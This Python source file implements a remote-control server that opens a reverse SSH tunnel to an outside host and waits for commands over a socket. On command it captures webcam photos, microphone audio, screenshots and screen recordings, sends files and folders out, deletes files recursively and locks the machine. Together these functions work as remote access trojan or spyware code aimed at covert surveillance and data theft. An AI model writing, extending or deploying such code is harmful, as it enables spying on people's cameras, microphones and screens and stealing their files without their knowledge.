import os
import sys
import time
import cv2
import mss
import signal
import socket
import shutil
import platform 
import webbrowser
import subprocess
import numpy as np
import urllib.parse
import sounddevice as sd  
from scipy.io.wavfile import write 

class SocketServer:
    def __init__(self, host='0.0.0.0', port=1221):
        """Initialize the server and set up the listening socket."""
        
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow reusing the address
        self.server.bind((host, port))
        self.server.listen(1)

        self.current_directory = os.path.expanduser("~/.")  # Set current directory
        
        print(f"Server is listening on {host}:{port}")
        
        self.conn = None
        self.addr = None

        # Handle Ctrl+C gracefully
        # don't terminate the session unless an explicit command is sent from the client
        # signal.signal(signal.SIGINT, self.handle_exit)

    def handle_exit(self, signum, frame):
        """Gracefully handle server shutdown on Ctrl+C."""
        print("\nCaught SIGINT (Ctrl+C). Server is continuing to listen...")
        pass

    def handle_client(self):
        """Handle communication with a connected client."""
        print(f"Connection established with {self.addr}")

        while True:
            try:
                command = self.conn.recv(4096).decode()
                if not command:
                    print("Client disconnected.")
                    break

                if command.lower() == "terminate":
                    print("Received FORCE EXIT command. Closing the server...")
                    self.conn.send("Server shutting down on FORCE EXIT.".encode())
                    self.conn.close()
                    self.server.close()
                    sys.exit(0)

                if command.lower().startswith("cp "):
                    file_name = command.split(maxsplit=1)[1]
                    self.send_file_to_instance(file_name)
                    continue

                if command.lower().startswith("cpdir "):
                    folder_name = command.split(maxsplit=1)[1]
                    self.send_folder_to_instance(folder_name)
                    continue

                if command.lower().startswith("picture"):
                    file_name = command.split()[1] 
                    self.take_picture(file_name)
                    continue

                if command.lower().startswith("shot"):
                    file_name = command.split()[1] 
                    self.take_screenshot(file_name)
                    continue

                if command.lower().startswith("voice "):
                    parts = command.split()  # This splits by whitespace
                    if len(parts) >= 3:
                        file_name = parts[1]
                        duration = int(parts[2])
                    self.record_voice(file_name, duration)
                    continue

                if command.lower().startswith("scrnrec "):
                    parts = command.split()  # This splits by whitespace
                    if len(parts) >= 3:
                        file_name = parts[1]
                        duration = int(parts[2])
                    self.record_screen(file_name, duration)
                    continue

                if command.lower().startswith("sys "):
                    parts = command.split()  # Split command by whitespace
                    if len(parts) < 2:
                        print("Invalid sys command format. Usage: sys <system control command> | sys <category> <action>")
                        continue
                    
                    # Extract the main command (e.g., "vol", "brightness", "lock", "sleep")
                    sys_control = parts[1]  
                    
                    # Simple system control commands
                    if sys_control in ["lock", "sleep"]:  
                        self.system_control(sys_control)

                    elif sys_control == "vol":  # Volume or brightness control
                        if len(parts) >= 3:  # Ensure there's an action for these categories
                            action = parts[2]  # Extract the action (e.g., "up", "down", "mute", "unmute")
                            if sys_control in ["vol", "volume"]:
                                self.adjust_volume(action)
                        else:
                            print(f"Invalid {sys_control} command format. Usage: sys {sys_control} <action>")
                    else:
                        print(f"Unknown sys control command: '{sys_control}'")
                    continue

                if command.lower().startswith("slx "):
                    query = command[len("slx "):].strip()  # Extract the search query
                    self.slx_search(query)
                    continue

                if command.lower().startswith("rm "):
                    try:
                        parts = command.split(">>")
                        parts = [part.strip() for part in parts]  # Remove extra spaces
                        if len(parts) == 2:  # Non-recursive delete
                            file_path = parts[1]
                            self.rm_folder_or_file(file_path)
                        elif len(parts) == 3:  # Recursive delete
                            rm_flag = parts[1]
                            file_path = parts[2]
                            if rm_flag == '-r':
                                self.rm_folder_or_file(file_path, rm_flag)
                            else:
                                self.conn.send(str("Invalid flag. Use -r for recursive.").encode())
                        else:
                            self.conn.send(str("Invalid command format.").encode())
                    except Exception as e:
                        self.conn.send(str(f"Error: {e}").encode())

                response = self.process_command(command)
                self.conn.send(response.encode())
            except ConnectionResetError:
                print("Client connection reset. Waiting for a new client...")
                break
            except ConnectionAbortedError as e:
                print(f"Error during shutdown: {e}")
                sys.exit(1)  # Exit with an error code to indicate a problem
            except Exception as e:
                print(f"Error handling command: {e}")
                self.conn.send(f"ERROR: {e}".encode())

        self.conn.close()
        print(f"Connection with {self.addr} closed.")

    def process_command(self, command):
        if command.lower() == "ls":
            return self.list_files()
        elif command.lower().startswith("cd "):
            return self.change_directory(command[3:].strip())
        elif command.lower() == "pwd":
            return self.pwd()
        else:
            return "Unknown command."

    def list_files(self):
        """List files in the current directory."""
        try:
            files = os.listdir(self.current_directory)
            return "\n".join(files) if files else "Directory is empty."
        except Exception as e:
            return f"Error listing files: {e}"

    def change_directory(self, new_dir):
        """Change the server's current working directory."""
        try:
            new_path = os.path.join(self.current_directory, new_dir)
            if os.path.isdir(new_path):
                self.current_directory = new_path
                return f"Changed directory to: {self.current_directory}"
            else:
                return f"{new_dir} is not a valid directory."
        except Exception as e:
            return f"Error changing directory: {e}"

    def pwd(self):
        """Return the server's current working directory."""
        return self.current_directory

    def send_file_to_instance(self, file_name):
        """Send a file to the client."""
        full_path = os.path.join(self.current_directory, file_name)

        if not os.path.isfile(full_path):
            self.conn.send(f"ERROR: File '{file_name}' not found.".encode())
            return

        try:
            file_size = os.path.getsize(full_path)
            self.conn.send(str(file_size).encode())
            response = self.conn.recv(4096).decode()
            if response != "READY":
                print("Client not ready. Aborting file transfer.")
                return

            with open(full_path, "rb") as file:
                while chunk := file.read(4096):
                    self.conn.send(chunk)

            self.conn.send(b"END")  # Send end marker
            print(f"File '{file_name}' sent successfully.")
        except Exception as e:
            print(f"Error sending file: {e}")

    # Add these methods to the SocketServer class

    def send_folder_to_instance(self, folder_name):
        """Send a folder and its contents to the client."""
        full_path = os.path.join(self.current_directory, folder_name)
        
        if not os.path.isdir(full_path):
            self.conn.send(f"ERROR: Folder '{folder_name}' not found.".encode())
            return

        try:
            # First send metadata about files and folders
            files_data = []
            total_size = 0
            
            for root, dirs, files in os.walk(full_path):
                rel_root = os.path.relpath(root, self.current_directory)
                for file in files:
                    file_path = os.path.join(rel_root, file)
                    full_file_path = os.path.join(self.current_directory, file_path)
                    file_size = os.path.getsize(full_file_path)
                    files_data.append({
                        'path': file_path,
                        'size': file_size,
                        'type': 'FILE'
                    })
                    total_size += file_size
                
                for dir in dirs:
                    dir_path = os.path.join(rel_root, dir)
                    files_data.append({
                        'path': dir_path,
                        'size': 0,
                        'type': 'DIR'
                    })

            # Send metadata first
            metadata = {
                'total_size': total_size,
                'files': files_data
            }
            metadata_str = str(metadata)
            self.conn.send(str(len(metadata_str)).encode())
            response = self.conn.recv(4096).decode()
            
            if response != "READY":
                return
                
            self.conn.send(metadata_str.encode())
            response = self.conn.recv(4096).decode()
            
            if response != "METADATA_RECEIVED":
                return

            # Send each file
            for file_info in files_data:
                if file_info['type'] == 'FILE':
                    full_file_path = os.path.join(self.current_directory, file_info['path'])
                    
                    with open(full_file_path, "rb") as file:
                        remaining = file_info['size']
                        while remaining > 0:
                            chunk_size = min(4096, remaining)
                            chunk = file.read(chunk_size)
                            if not chunk:
                                break
                            self.conn.send(chunk)
                            remaining -= len(chunk)
                        
                        # Wait for confirmation before next file
                        response = self.conn.recv(4096).decode()
                        if response != "FILE_RECEIVED":
                            raise Exception(f"File transfer interrupted: {file_info['path']}")

            print(f"Folder '{folder_name}' sent successfully.")
        except Exception as e:
            print(f"Error sending folder: {e}")
            self.conn.send(f"ERROR: {str(e)}".encode())

    def record_voice(self, file_name, duration):
        """Record a voice message and save it as a .wav file."""

        try:
            print(f"Recording for {duration} seconds...")
            
            # Record audio
            sample_rate = 44100  # Sampling rate in Hz
            audio_data = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=1, dtype="int16")
            sd.wait()  # Wait until recording is finished
            
            # Save the recording
            full_path = os.path.join(self.current_directory, file_name)
            write(full_path, sample_rate, audio_data)
            print(f"Recording saved as '{file_name}'")
            
            # Send the recorded file without additional messages
            self.send_file_to_instance(file_name)
        except Exception as e:
            print(f"Error recording voice: {e}")
            self.conn.send(f"ERROR: {str(e)}".encode())

    def take_picture(self, file_name):

        try:
            # Open the camera with a higher resolution
            cap = cv2.VideoCapture(0)
            
            # Check if the camera is accessible
            if not cap.isOpened():
                print("Error: Unable to access the camera.")
                return

            # Set camera resolution (width x height)
            # Example: 1920x1080 for Full HD resolution
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1920)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080)

            # Read a frame
            ret, frame = cap.read()
            if ret:
                # Save the image with better compression quality
                full_path = os.path.join(self.current_directory, file_name)
                
                # Specify high JPEG quality (0-100, where 100 is the highest)
                quality_params = [int(cv2.IMWRITE_JPEG_QUALITY), 95]
                
                # Write the image to disk with high quality
                cv2.imwrite(full_path, frame, quality_params)
                
                print(f"Picture saved as '{full_path}'")
                self.send_file_to_instance(file_name)
            else:
                print("Error: Unable to capture an image.")
            
            cap.release()
        except Exception as e:
            print(f"Error taking picture: {e}")


    def take_screenshot(self, file_name="screenshot.png"):

        try:
            if 'DISPLAY' not in os.environ:
                os.environ['DISPLAY'] = ':99'
                
            with mss.mss() as sct:
                full_path = os.path.join(self.current_directory, file_name)
                sct.shot(output=full_path)
                print(f"Screenshot saved as '{file_name}'")
                self.send_file_to_instance(file_name)
                
        except Exception as e:
            print(f"Error taking screenshot: {e}")

    def record_screen(self, file_name="recording.mp4", duration=5, fps=1, zoom_factor=0.8):

        try:
            with mss.mss() as sct:
                # Get the primary monitor
                monitor = sct.monitors[1]
                
                # Get original dimensions
                orig_width = monitor["width"]
                orig_height = monitor["height"]
                
                # Calculate zoomed out dimensions
                width = int(orig_width * zoom_factor)
                height = int(orig_height * zoom_factor)
                
                # Ensure dimensions are even for video encoding
                width = width // 2 * 2
                height = height // 2 * 2
                
                # Define the capture area for full screen
                monitor = {
                    'top': 0,
                    'left': 0,
                    'width': orig_width,
                    'height': orig_height,
                    'mon': 1
                }

                full_path = os.path.join(self.current_directory, file_name)
                command = [
                    'ffmpeg', '-y',
                    '-f', 'rawvideo',
                    '-vcodec', 'rawvideo',
                    '-s', f'{width}x{height}',
                    '-pix_fmt', 'bgr24',
                    '-r', str(fps),
                    '-i', '-',
                    '-c:v', 'libx264',
                    '-preset', 'medium',
                    '-crf', '23',
                    '-t', str(duration),
                    '-pix_fmt', 'yuv420p',
                    '-vsync', 'cfr',
                    full_path
                ]

                # Start FFmpeg process
                p = subprocess.Popen(command, stdin=subprocess.PIPE, stderr=subprocess.PIPE)

                total_frames = int(duration * fps)
                frames_written = 0
                
                print(f"Recording with {int((1-zoom_factor)*100)}% zoom out for {duration} seconds at {fps} FPS...")

                start_time = time.time()
                frame_time = 1.0 / fps
                next_frame_time = start_time

                while frames_written < total_frames:
                    current_time = time.time()
                    if current_time >= next_frame_time:
                        # Capture new frame to detect tab switches
                        frame = np.array(sct.grab(monitor))
                        frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                        
                        # Scale down the frame to create zoom out effect
                        frame = cv2.resize(frame, (width, height), 
                                        interpolation=cv2.INTER_AREA)

                        try:
                            p.stdin.write(frame.tobytes())
                            frames_written += 1
                        except IOError:
                            print("Error writing frame to FFmpeg. Stopping.")
                            break

                        # Calculate next frame timing
                        next_frame_time = start_time + (frames_written * frame_time)
                    else:
                        # Small sleep to prevent CPU overload
                        time.sleep(0.001)

                # Finalize FFmpeg process
                p.stdin.close()
                p.wait()

                if os.path.exists(full_path) and os.path.getsize(full_path) > 0:
                    print(f"Recording saved as '{file_name}'")
                    self.send_file_to_instance(file_name)
                else:
                    print(f"Error: Recording failed. File '{file_name}' not created.")

        except Exception as e:
            print(f"Error recording screen: {e}")

    def system_control(self, command):
        """Handle system control commands for Windows and macOS."""
        try:

            # Determine the operating system
            system = platform.system().lower()

            # Define system-specific commands
            commands = {

                #'shutdown': {
                #    'windows': 'shutdown /s /t 0',
                #    'darwin': 'sudo shutdown -h now'
                #},
                
                #'restart': {
                #    'windows': 'shutdown /r /t 0',
                #    'darwin': 'sudo shutdown -r now'
                #},

                'lock': {
                    'windows': 'rundll32.exe user32.dll,LockWorkStation',
                    'darwin': 'osascript -e "tell application \\"System Events\\" to keystroke \\"q\\" using {control down, command down}"'
                },

                'sleep': {
                    'windows': 'rundll32.exe powrprof.dll,SetSuspendState 0,1,0',
                    'darwin': 'pmset sleepnow'
                }
            }

            # Retrieve the command for the specific system
            os_command = commands.get(command, {}).get(system)

            if os_command:
                print(f"Executing {command} command for {system.capitalize()}: {os_command}")
                os.system(os_command)
                return f"Successfully executed {command} command on {system.capitalize()}."
            else:
                return f"Command '{command}' is not supported on this operating system: {system.capitalize()}."

        except Exception as e:
            return f"Error executing system command: {str(e)}"

    def adjust_volume(self, action):

        volume_mapping = {
            'up': 'increase',
            'down': 'decrease',
            'mute': 'mute',
            'unmute': 'unmute'
        }
        
        commands = {
            'volume': {
                'windows': {
                    'increase': 'nircmd.exe changesysvolume 5000',
                    'decrease': 'nircmd.exe changesysvolume -5000',
                    'mute': 'nircmd.exe mutesysvolume 1',
                    'unmute': 'nircmd.exe mutesysvolume 0'
                },
                'darwin': {
                    'increase': 'osascript -e "set volume output volume ((output volume of (get volume settings)) + 10)"',
                    'decrease': 'osascript -e "set volume output volume ((output volume of (get volume settings)) - 10)"',
                    'mute': 'osascript -e "set volume output muted true"',
                    'unmute': 'osascript -e "set volume output muted false"'
                }
            }
        }
        
        os_type = platform.system().lower()
        if os_type in commands['volume']:
            mapped_action = volume_mapping.get(action)
            if not mapped_action:
                print(f"Invalid volume action: {action}. Allowed actions are: {', '.join(volume_mapping.keys())}")
                return
            
            command = commands['volume'][os_type].get(mapped_action)
            if command:
                try:
                    os.system(command)
                except Exception as e:
                    print(f"Failed to execute volume command '{action}': {e}")
            else:
                print(f"Volume action '{action}' not supported on {os_type}.")
        else:
            print(f"Volume control is not supported on this OS: {os_type}.")

    def slx_search(self, command):
        """Perform a Google or YouTube search, or open a YouTube video directly based on the command."""

        if not command:
            print("Please provide a valid command.")
            return

        try:
            command = command.strip()
            prefix, _, content = command.partition(":")  # Split at the first ":"
            prefix = prefix.lower()  # Make the command prefix case-insensitive
            content = content.strip()  # Preserve the case of the content (e.g., URLs)

            print(f"Command received: {prefix}:{content}")  # Debugging

            # Handle YouTube video link (yt:)
            if prefix in ["yt", "yt "]:
                youtube_link = content
                youtube_link = urllib.parse.urlparse(youtube_link)  # Parse the URL
                if youtube_link.scheme in ["http", "https"] and ("youtube.com" in youtube_link.netloc or "youtu.be" in youtube_link.netloc):
                    sanitized_link = youtube_link.geturl()  # Get the full URL
                    print(f"Opening YouTube video: {sanitized_link}")
                    webbrowser.open(sanitized_link)
                else:
                    print(f"Invalid YouTube link: {youtube_link.geturl()}")
                return

            # Handle YouTube search (youtube)
            if prefix in ["youtube", "youtube "]:
                search_query = content
                if search_query:
                    youtube_search_url = f"https://www.youtube.com/results?search_query={'+'.join(search_query.split())}"
                    print(f"Searching YouTube for: {search_query}")
                    webbrowser.open(youtube_search_url)
                else:
                    print("Please provide a query to search on YouTube.")
                return

            # Handle Google search (google)
            if prefix in ["google", "google "]:
                search_query = content
                if search_query:
                    google_search_url = f"https://www.google.com/search?q={'+'.join(search_query.split())}"
                    print(f"Searching Google for: {search_query}")
                    webbrowser.open(google_search_url)
                else:
                    print("Please provide a query to search on Google.")
                return

            # Default case if no matching command
            print("Invalid command. Use 'google query', 'youtube query', or 'yt:link to YouTube video'.")

        except Exception as e:
            print(f"Error processing the command: {e}")

    def rm_folder_or_file(self, file_path, rm_path=None):
        if rm_path == '-r':  # Recursive delete
            if os.path.exists(file_path):
                shutil.rmtree(file_path)
                self.conn.send(str(f"{file_path} : Deleted").encode())
            else:
                self.conn.send(str(f"{file_path} : 404").encode())
        elif os.path.exists(file_path):  # Non-recursive delete
            os.remove(file_path)
            self.conn.send(str(f"{file_path} : Deleted").encode())
        else:
            self.conn.send(str(f"{file_path} : 404").encode())

    def start_reverse_tunnel(self, key_file, remote_port, local_port, ssh_host):
        ssh_cmd = [
            "ssh",
            "-v",
            "-o", "StrictHostKeyChecking=accept-new",
            "-i", key_file,
            "-N",
            "-R", f"0.0.0.0:{remote_port}:localhost:{local_port}",
            ssh_host
        ]
        subprocess.Popen(ssh_cmd)
        print(f"Reverse SSH tunnel started to {ssh_host}")

    def start_server(self, key_file, remote_port, local_port, ssh_host):
        
        self.start_reverse_tunnel(key_file, remote_port, local_port, ssh_host)

        while True:
            print("Waiting for a client connection...")
            self.conn, self.addr = self.server.accept()
            try:
                self.handle_client()
            except Exception as e:
                print(f"Error in client handling: {e}")

def server_cli(host, port, key_file, ssh_host):
    server = SocketServer(host, port)
    server.start_server(key_file=key_file, remote_port=port, local_port=port, ssh_host=ssh_host)